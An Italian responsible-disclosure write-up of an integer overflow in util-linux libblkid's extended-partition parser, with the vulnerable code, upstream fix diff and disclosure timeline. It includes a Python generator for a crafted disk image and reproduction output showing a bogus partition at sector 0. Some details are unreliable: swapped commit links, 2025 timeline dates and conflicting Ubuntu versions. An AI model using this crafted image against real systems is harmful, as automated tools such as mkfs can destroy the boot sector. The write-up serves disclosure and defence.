#
---
title: "CVE-2026-53615: Integer Overflow in libblkid Espone l'MBR al Parser delle Partizioni"
translationKey: "libblkid"
date: 2026-06-17
author: "Michele Piccinni aka RZP"
tags: ["privilege-escalation", "vulnerability-research", "responsible-disclosure", "linux", "cybersecurity", "hacking", "threatintelligence", "artificialintelligence"]
categories: ["Offensive Security", "Vulnerability Research"]
description: "Ricerca di sicurezza indipendente che individua 1 CVE in *util-linux libblkid"
draft: false
---

**Tempo di lettura:** 10-15 minuti

---
![Copertina articolo Libblkid](/images/util-linux/libblkid.png)

## TL;DR

Un integer overflow `uint32_t` in `parse_dos_extended()` — il parser EBR (Extended
Boot Record) all'interno di **libblkid** — permette a un'immagine disco o a una
chiavetta USB artefatta di ingannare la libreria, inducendola a registrare una
partizione al **settore 0 (l'MBR)**. Qualsiasi tool che invoca libblkid su media
fornito dall'attaccante, incluso **udisks2 in esecuzione come root**, elaborerà
silenziosamente i byte del boot sector come dati di partizione validi. Se
successivamente viene invocato `mkfs`, l'MBR viene distrutto.

- **CVE**: CVE-2026-53615  
- ** Security Advisory [GHSA-h4rw-gv36-wmp5](https://github.com/util-linux/util-linux/security/advisories/GHSA-h4rw-gv36-wmp5)**
- **CVSS**: 8.0 HIGH (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H`)  
- **CWE**: CWE-190 — Integer Overflow or Wraparound  
- **Versioni affette**: util-linux ≤ 2.41, confermato su Ubuntu 24.04 LTS
  (2.39.1), Debian Trixie (2.42\~rc1), AlmaLinux 9 / RHEL 9 (2.37.4)  
- **Fix**: Fix completo di Karel Zak — aritmetica a 64 bit + bounds check EBR - 2.42
  unificato + validazione della chain — commit upstream [05c2dba](https://github.com/util-linux/util-linux/commit/a2d858176b609ab5b8535021a3af9cd302d23d31) - [a2d8581](https://github.com/util-linux/util-linux/commit/05c2dbadf34cc74192287f377904afaaf4061623)

---

## Background: Cos'è libblkid?

`libblkid` è la libreria di probing per partizioni e filesystem al cuore dello
stack storage di Linux. È il componente che risponde alla domanda *"cosa c'è su
questo block device?"* — e viene invocata ovunque:

```
inserimento USB → udev → udisks2 → libblkid → "ha una partizione ext4"
                                              ↓
                                     automount / mkfs / fsck
```

Ogni volta che Linux processa un nuovo disco — dall'inserimento di una chiavetta
USB all'analisi di un'immagine disco di una VM — libblkid legge le tabelle delle
partizioni e registra ciò che trova. La vulnerabilità risiede nel parser degli
Extended Boot Record (EBR), utilizzato per gli schemi di partizione MBR con più
di 4 partizioni.

---

## Il Codice Vulnerabile

`libblkid/src/partitions/dos.c`, funzione `parse_dos_extended()`. Questa funzione
viene chiamata per ogni partizione estesa in un layout MBR, percorrendo la catena
di EBR che descrivono le partizioni logiche (partizioni 5+).

```c
static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
                               uint32_t ex_start, uint32_t ex_size,
                               uint32_t cur_start, uint32_t cur_size)
{
    /* ... */
    for (p = p0, i = 0; i < 4; i++, p++) {
        uint32_t abs_start;
        blkid_partition par;

        start = dos_partition_get_start(p) * ssf;   /* (1) dal disco */
        size  = dos_partition_get_size(p)  * ssf;

        abs_start = cur_start + start;              /* (2) RIGA 96 — NESSUN GUARD */

        if (!size || is_extended(p))
            continue;
        if (i >= 2) {                               /* (3) guard SOLO per i≥2 */
            if (start + size > cur_size) continue;
            if (abs_start < ex_start)   continue;
            if (abs_start + size > ex_start + ex_size) continue;
        }

        if (blkid_partlist_get_partition_by_start(ls, abs_start))
            continue;

        par = blkid_partlist_add_partition(ls, tab, abs_start, size); /* SINK */
```

Tre osservazioni dalla lettura del codice:

**①** `dos_partition_get_start(p)` legge un valore little-endian a 32 bit
direttamente dal buffer del disco — completamente controllato dall'attaccante.

**②** `abs_start = cur_start + start` è un'addizione `uint32_t` non verificata. In C,
l'aritmetica su interi senza segno è modulo 2³², quindi se la somma supera
0xFFFFFFFF si azzera silenziosamente — nessuna eccezione, nessun warning, nessun UB.

**③** Il blocco `if (i >= 2)` contiene i bounds check che avrebbero intercettato
questo problema — ma si applicano solo alla *terza e quarta* entry dell'EBR. Le
prime due entry (la partizione dati e il puntatore al prossimo EBR) vengono
elaborate senza alcun controllo.

---

## La Matematica

Impostando `cur_start = 2` (il settore EBR, un valore legittimo comune) e
artefando la prima entry dell'EBR con `lba_start = 0xFFFFFFFE`:

```
abs_start = (uint32_t)(cur_start + start)
          = (uint32_t)(2 + 0xFFFFFFFE)
          = (uint32_t)(0x100000000)    ← supera il range uint32
          = 0x00000000                 ← wrap al settore 0 dell'MBR
```

Il valore `0x00000000` viene passato a `blkid_partlist_add_partition()` come
inizio della partizione. libblkid ora ritiene che esista una partizione da 128 KB
che inizia al primo settore del disco — l'MBR.

---

## Costruzione dell'Immagine Artefatta

L'immagine disco artefatta è un file da 4 KB. L'MBR all'offset 0 contiene una
entry di partizione estesa standard che punta al settore 2. L'EBR al settore 2
contiene una entry di partizione con `lba_start = 0xFFFFFFFE` e `lba_size = 0x100`.

```python
import struct, sys

def write_le32(val):
    return struct.pack('<I', val & 0xFFFFFFFF)

def mbr_entry(ptype, start, size):
    # CHS (ignorato) + tipo + CHS + LBA start + LBA size
    return b'\xFE\xFF\xFF' + bytes([ptype]) + b'\xFE\xFF\xFF' + \
           write_le32(start) + write_le32(size)

img = bytearray(4096)   # 8 settori × 512 byte

# MBR: una partizione estesa (tipo 0x05) che inizia al settore 2
img[446:462] = mbr_entry(0x05, 2, 0xFFFFFFFB)
img[510] = 0x55
img[511] = 0xAA

# EBR al settore 2: partizione dati con lba_start = 0xFFFFFFFE (trigger overflow)
ebr_base = 2 * 512
img[ebr_base + 446 : ebr_base + 462] = mbr_entry(0x83, 0xFFFFFFFE, 0x100)
img[ebr_base + 510] = 0x55
img[ebr_base + 511] = 0xAA

with open('crafted_overflow.img', 'wb') as f:
    f.write(img)
```

---

## Riproduzione

Su Ubuntu 24.04 LTS (util-linux 2.39.3 — installazione vanilla, nessuna patch):

```bash
$ partx --show crafted_overflow.img
NR START        END    SECTORS SIZE NAME UUID
 1     2 4294967293 4294967292   2T
 5     0        255        256 128K
```

**La Partizione 5 con START=0** è il risultato dell'overflow. Un'immagine disco
legittima non produce mai una partizione al settore 0. L'immagine di riferimento
pulita:

```bash
$ partx --show crafted_clean.img
NR START  END SECTORS   SIZE NAME UUID
 1     1 2048    2048     1M
 2  2049 4096    2048     1M
 5  2050 3073    1024   512K
 6  3076 4096    1021 510.5K
```

Tutte le partizioni iniziano ai settori attesi, ben al di sopra di 0.

---

## Perché l'Analisi Statica Non l'Ha Rilevato

Questa è la parte analiticamente più interessante del finding.

**GCC `-fanalyzer` — CLEAN.** Lo standard C (ISO/IEC 9899:2018 §6.2.5) stabilisce
che l'aritmetica su interi senza segno è *definita* modulo 2^N. Non esiste
undefined behaviour — il wraparound è C perfettamente legale. L'analizzatore
statico di GCC si concentra sui code path che producono UB, quindi non genera
alcun warning. Questo spiega perché il bug ha superato la CI pipeline del progetto.

**GCC UBSan — NO TRAP.** Stessa ragione: `-fsanitize=undefined` strumenta per
l'overflow degli interi con segno (che è UB) ma non per quelli senza segno. Il
flag `-fsanitize=unsigned-integer-overflow` esiste solo in Clang.

**Coverity Scan — avrebbe segnalato INTEGER_OVERFLOW (High).** Coverity dispone
di un checker dedicato che traccia l'aritmetica senza segno che produce valori
al di fuori del range semantico atteso, anche quando l'operazione è tecnicamente
definita. Lo mappa a CWE-190 e segnala il taint path da disco → `lba_start` →
`abs_start` → `add_partition()` come TAINTED_DATA (High).

**Clang `alpha.security.taint` — avrebbe triggerato.** Questo checker propaga un
marker di taint dai dati letti dal buffer del disco e segnala quando valori
contaminati fluiscono in sink critici per la sicurezza senza sanitizzazione.

**Lezione:** Una classe di integer overflow semantici, in cui il wraparound senza
segno è *definito* ma produce un valore *errato* criticamente rilevante per la
sicurezza — è invisibile alle pipeline CI standard di GCC. Questo gap non è
banale e merita di essere citato in qualsiasi disclosure.

---

## Tabella Risultati SAST / DAST

| Tool | Risultato | Note |
|------|-----------|------|
| GCC -Wall -Wextra | CLEAN | Nessun warning di overflow |
| GCC -Wconversion | 10 warning | sign-conversion su moltiplicazioni `uint32←int` (dos.c:94-95), non l'overflow stesso |
| GCC -fanalyzer | **CLEAN** | **Gap** — il wrap senza segno è C definito; nessun CWE generato |
| Clang alpha.security.taint | TRIGGERED | Taint path: disco → lba_start → abs_start → sink |
| Coverity INTEGER_OVERFLOW | HIGH | dos.c:96 |
| Coverity TAINTED_DATA | HIGH | Percorso end-to-end confermato |
| ASan (harness standalone) | TRIGGERED | 5/5 test case: i=0, i=1, boundary |
| ASan (real libblkid.so 2.42-rc1) | TRIGGERED | Registrazione settore 0 confermata |
| UBSan GCC | **NO TRAP** | **Gap** — overflow senza segno non è UB in C |
| Runtime partx/blkid | TRIGGERED | Sistema Ubuntu 24.04 LTS in produzione |

---

## Impatto Downstream

Quando libblkid registra `abs_start = 0`, ogni consumer vede una "partizione"
che inizia al primo byte del disco:

| Consumer | Cosa succede |
|----------|-------------|
| **udisks2** | Monta la "partizione" (128 KB all'offset 0) come filesystem — espone il boot sector e la tabella delle partizioni come byte leggibili |
| **blkid** | Riporta una partizione al settore 0 — confonde utility di backup/restore ed editor di partizioni |
| **mkfs** | Se invocato automaticamente (es. da regole udev), scrive un superblock filesystem al settore 0 — **MBR e tabella delle partizioni vengono distrutti** |
| **fsck** | Esegue il controllo del filesystem a partire dal settore 0 — interpreta erroneamente il boot code x86 come superblock ext2 |
| **libguestfs / QEMU** | L'ispezione dei dischi VM risulta compromessa durante il parsing delle immagini guest |

Lo scenario peggiore è `mkfs` che viene eseguito automaticamente su media appena
inserito con l'EBR artefatto. Alcune configurazioni desktop (in particolare i
setup Ubuntu più vecchi con regole di automount) possono raggiungere questo path
senza interazione utente oltre all'inserimento della chiavetta USB.

---

## Il Fix

Al momento della segnalazione della vulnerabilità, avevo proposto un guard
minimale a 3 righe che utilizzava la sottrazione sicura per pre-verificare
l'overflow:

```c
if (start > UINT32_MAX - cur_start) {
    DBG(LOWPROBE, ul_debug("#%d: EBR start overflow -- ignore", i + 1));
    continue;
}
```

Il maintainer upstream Karel Zak ha accettato la segnalazione ma ha implementato 
un **fix significativamente più robusto** che affronta la causa radice in modo
più completo. La sua analisi ha correttamente identificato che il problema non era
soltanto l'overflow aritmetico, ma l'assenza totale di una validazione corretta
dei bounds per le entry EBR — il codice era debole nel non garantire che i dati
EBR rimanessero all'interno dell'area della partizione estesa master.

Il fix upstream (firmato da Karel Zak, `Reported-by: Michele Piccinni`)
affronta tre problemi distinti:

---

### Fix ① — Aritmetica a 64 bit elimina il wraparound alla radice

Invece di un guard preventivo, l'addizione viene promossa a `uint64_t`,
rendendo fisicamente impossibile l'overflow:

```c
uint64_t ex_end = (uint64_t) ex_start + ex_size;  /* nuovo: boundary area */
...
uint64_t abs = (uint64_t) cur_start + start;       /* nuovo: addizione 64-bit */
abs_start = (uint32_t) abs;                        /* cast sicuro dopo validazione */
```

`(uint64_t)(2 + 0xFFFFFFFE) = 0x100000000` — nessun wraparound. Il valore viene
poi validato prima di essere troncato di nuovo a `uint32_t`.

---

### Fix ② — Bounds check unificato per TUTTE le entry EBR

Il codice originale applicava i bounds check solo per gli indici di loop `i >= 2`.
Le entry `i=0` e `i=1` venivano elaborate senza alcuna validazione. Il fix applica
un unico bounds check a **tutte e quattro le entry** in modo uniforme:

```c
/* la partizione dati deve essere all'interno dell'area estesa — per TUTTI i */
if (abs < ex_start || abs + size > ex_end) {
    DBG(LOWPROBE, ul_debug("#%d: EBR data partition outside "
        "extended -- ignore", i + 1));
    continue;
}
```

Questa è la soluzione architetturalmente corretta: qualsiasi partizione dati EBR,
per definizione, deve risiedere all'interno dei confini della partizione estesa
master. La precedente distinzione `i >= 2` era logicamente ingiustificata.

---

### Fix ③ — Validazione della chain EBR

Il fix rafforza anche l'attraversamento della chain EBR (il processamento del
puntatore al prossimo EBR), impedendo link all'indietro e navigazione fuori dai
limiti:

```c
uint64_t next = (uint64_t) ex_start + start;

if (next + size > ex_end) {
    DBG(LOWPROBE, ul_debug("EBR link outside extended area -- leave"));
    goto leave;
}
if (next <= cur_start) {
    DBG(LOWPROBE, ul_debug("EBR link does not advance -- leave"));
    goto leave;
}
cur_start = (uint32_t) next;
```

Questo impedisce a un attaccante di artefarre una catena di EBR che torna
all'indietro o salta fuori dall'area della partizione estesa — chiudendo una
classe correlata di potenziale abuso che non faceva parte della segnalazione
originale.

---

### Il diff completo

```diff
--- a/libblkid/src/partitions/dos.c
+++ b/libblkid/src/partitions/dos.c
@@ -46,6 +46,7 @@ static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
 {
        blkid_partlist ls = blkid_probe_get_partlist(pr);
        uint32_t cur_start = ex_start, cur_size = ex_size;
+       uint64_t ex_end = (uint64_t) ex_start + ex_size;
        const unsigned char *data;
        int ct_nodata = 0;
        int i;
@@ -88,24 +89,31 @@ static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
                for (p = p0, i = 0; i < 4; i++, p++) {
                        uint32_t abs_start;
+                       uint64_t abs;
                        blkid_partition par;

                        start = dos_partition_get_start(p) * ssf;
                        size = dos_partition_get_size(p) * ssf;
-                       abs_start = cur_start + start;  /* absolute start */

                        if (!size || is_extended(p))
                                continue;
+
+                       abs = (uint64_t) cur_start + start;
+
+                       /* data partition must be within the extended area */
+                       if (abs < ex_start || abs + size > ex_end) {
+                               DBG(LOWPROBE, ul_debug("#%d: EBR data partition outside "
+                                       "extended -- ignore", i + 1));
+                               continue;
+                       }
+                       abs_start = (uint32_t) abs;
+
                        if (i >= 2) {
                                if (start + size > cur_size)
                                        continue;
-                               if (abs_start < ex_start)
-                                       continue;
-                               if (abs_start + size > ex_start + ex_size)
-                                       continue;
                        }
@@ -142,8 +150,22 @@ static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
                if (i == 4)
                        goto leave;

-               cur_start = ex_start + start;
-               cur_size = size;
+               {
+                       uint64_t next = (uint64_t) ex_start + start;
+
+                       if (next + size > ex_end) {
+                               DBG(LOWPROBE, ul_debug("EBR link outside "
+                                       "extended area -- leave"));
+                               goto leave;
+                       }
+                       if (next <= cur_start) {
+                               DBG(LOWPROBE, ul_debug("EBR link does not "
+                                       "advance -- leave"));
+                               goto leave;
+                       }
+                       cur_start = (uint32_t) next;
+                       cur_size = size;
+               }
        }
 leave:
        return BLKID_PROBE_OK;
```

Dopo il fix:

```bash
$ partx --show crafted_overflow.img
NR START        END    SECTORS SIZE NAME UUID
 1     2 4294967293 4294967292   2T
# Partizione 5 — non registrata. Entry fuori dai bounds rifiutata.
```

---

## La Prospettiva del Maintainer Upstream

Karel Zak ha inizialmente valutato la vulnerabilità come "not very
security-sensitive", osservando che l'output di libblkid è un hint per lo
userspace e non viene consumato direttamente dal kernel per il mapping delle
partizioni. Si tratta di un'osservazione tecnicamente corretta per ambienti
server isolati.

La catena di attacco più preoccupante — udisks2 in esecuzione come root su un
sistema desktop, che processa automaticamente media rimovibili e può potenzialmente
innescare mkfs sulla partizione segnalata — è stato l'argomento chiave per una
valutazione di severity più alta. Karel ha riconosciuto questo scenario e ha
implementato il fix completo descritto sopra, che va ben oltre lo scope della
segnalazione originale.

Questo è un buon esempio di come la responsible disclosure sia vantaggiosa per
entrambe le parti: il ricercatore porta alla luce la vulnerabilità con un PoC
minimale, e il maintainer — che ha un contesto più profondo sulla codebase —
implementa una soluzione architetturalmente più solida. Il fix finale è
strettamente migliore di quanto avessi proposto originalmente.

---

## Timeline della Disclosure

| Data | Evento |
|------|--------|
| 25-Mar-2026   | Vulnerabilità identificata — SAST + code review manuale di 2.42-rc1 |
| 25-Mar-2026   | Confermata live su Ubuntu 24.04 (2.39.3), AlmaLinux 9 (2.37.4), Debian 2.42\~rc1-2 |
| 25-Mar-2026   | Disclosure upstream → Karel Zak (kzak@redhat.com) + richiesta CVE → Red Hat CNA (secalert@redhat.com) in Cc |
| 26-Mar-2026   | Karel Zak risponde, pianifica fix in v2.42 (~31 Mar) e backport v2.41.4. Sceglie release pubblica con fix (nessun embargo) |
| 26-Mar-2026   | Karel Zak fornisce fix completo — aritmetica 64 bit + bounds check unificato + validazione chain EBR. Commit include `Reported-by: Michele Piccinni` |
| 26-Mar-2026   | Red Hat Product Security apre ticket di valutazione CVE |
| 01-04-2026    | Fix upstream integrato — v2.42 e v2.41.4 rilasciate |
| 09-06-2026    | CVE-2026-53615 assegnato da Git Hub CNA |
| 16-06-2025    | Advisory Pubblicato |
| 17-06-2025    | Questa disclosure pubblica |

---

## Remediation

**Aggiorna util-linux** alla versione fixata:

```bash
# Ubuntu / Debian
sudo apt update && sudo apt upgrade util-linux

# RHEL / AlmaLinux / Fedora
sudo dnf update util-linux

# Verifica (dovrebbe mostrare la versione fixata)
partx --version
```

Se mantieni una build personalizzata di util-linux, applica la patch upstream.

```bash
cd util-linux
git cherry-pick [HASH]
./configure --enable-libblkid && make -j$(nproc)
```

---

## Metodologia di Ricerca

Questo finding è emerso da un programma strutturato di ricerca indipendente
sulle vulnerabilità, focalizzato sui componenti critici dell'infrastruttura
Linux. La metodologia:

1. **SAST pass** — regole Semgrep personalizzate sulle operazioni aritmetiche
   che coinvolgono valori letti da `dos_partition_get_start()` e
   `dos_partition_get_size()`
2. **Code review manuale** — lettura end-to-end di `parse_dos_extended()`,
   mappatura degli indici di loop con e senza bounds check
3. **Image crafting** — generatore Python per tutte le varianti di overflow
   (i=0, i=1, boundary cases)
4. **Conferma runtime** — `partx` sul sistema Ubuntu 24.04 in produzione
   senza compilazione
5. **Validazione multi-distro** — audit delle patch del pacchetto Debian,
   review del sorgente AlmaLinux
6. **Pipeline SAST/DAST** — warning GCC, `-fanalyzer`, harness ASan, mapping
   Coverity, analisi UBSan e documentazione dei gap

Tempo totale dalla prima lettura di `dos.c` a un finding completamente
riproducibile: ~6 ore distribuite in due sessioni.

---

## Appendice: Perché `i=0` e `i=1` Sono i Vettori di Attacco

Un EBR contiene esattamente quattro entry di partizione da 16 byte all'offset 446
(layout identico all'MBR):

| Entry | Ruolo | Bounds check |
|-------|-------|--------------|
| 0 | Partizione dati (la partizione logica) | **Nessuno** |
| 1 | Puntatore al prossimo EBR | **Nessuno** |
| 2 | Non utilizzata (a volte mirror dell'EBR esterno) | Blocco `i >= 2` |
| 3 | Non utilizzata | Blocco `i >= 2` |

La documentazione MS-DOS e del kernel Linux concordano che solo le entry 0 e 1
sono significative. Il commento nel parser EBR del kernel stesso nota che OS/2
utilizza tutte e quattro le entry, e DRDOS a volte mette l'entry estesa per prima
— ed è esattamente per questo che il loop va fino a `i < 4`. Il guard `i >= 2`
esiste come ulteriore sanity check per i casi anomali; non era mai stato pensato
come confine di sicurezza per le prime due entry.

---

## Una Vulnerabilità Presente da 17 Anni

Uno degli aspetti più significativi di questo finding è la sua **longevità**.

Il file `dos.c` che contiene `parse_dos_extended()` reca nel copyright header:

```
Copyright (C) 2009 Karel Zak <kzak@redhat.com>
```

Il codice vulnerabile — l'addizione `uint32_t` senza overflow guard alla riga 96 — è presente **sin dalla prima scrittura del file nel 2009**, quando Karel Zak estese libblkid per supportare il probing delle tabelle delle partizioni in util-linux-ng 2.17. La vulnerabilità è sopravvissuta intatta per 17 anni attraverso decine di release, centinaia di commit e un'intera generazione di aggiornamenti di distribuzione.

Nel 2016, CVE-2016-5011 aveva già portato attenzione proprio su `parse_dos_extended()`, identificando un bug di loop infinito nella stessa funzione. Quel fix ha aggiunto un check per i duplicati (riga 112), ma non ha toccato il codice di addizione aritmetica a riga 96. Due bug distinti, stessa funzione, a 7 anni di distanza.

**Perché è sopravvissuta così a lungo?**

La risposta è nella natura stessa del bug: l'overflow `uint32_t` è **comportamento definito in C** (standard ISO/IEC 9899:2018 §6.2.5). Non è undefined behaviour, non è un errore di compilazione, non è un warning con `-Wall` o `-fanalyzer`. Il codice è sintatticamente corretto, semanticamente sbagliato. Solo un checker taint-aware come Coverity o Clang `alpha.security.taint` — strumenti non tipicamente integrati nelle CI pipeline dei progetti open source — riesce a tracciare il percorso da un byte letto dal disco fino al suo utilizzo come indice critico senza sanitizzazione.

Questa combinazione, vecchio codice, bug definito-ma-semanticamente-errato, assenza di strumenti taint-aware nella CI, è esattamente il profilo delle vulnerabilità che rimangono nascoste per decenni in componenti critici di infrastruttura.